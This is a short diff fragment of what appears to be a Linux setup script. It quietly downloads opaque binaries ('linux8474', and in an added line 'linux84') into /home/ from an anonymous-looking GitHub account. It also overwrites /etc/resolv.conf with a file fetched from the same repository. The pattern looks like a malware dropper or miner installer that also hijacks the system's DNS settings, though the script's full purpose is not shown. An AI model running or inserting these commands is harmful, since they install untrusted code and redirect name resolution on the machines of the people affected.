@@ -58,6 +58,10 @@ cd /home/
 
 wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linux8474
 
+cd /home/
+
+wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linux84
+
 cd /etc/
 
 wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/resolv.conf
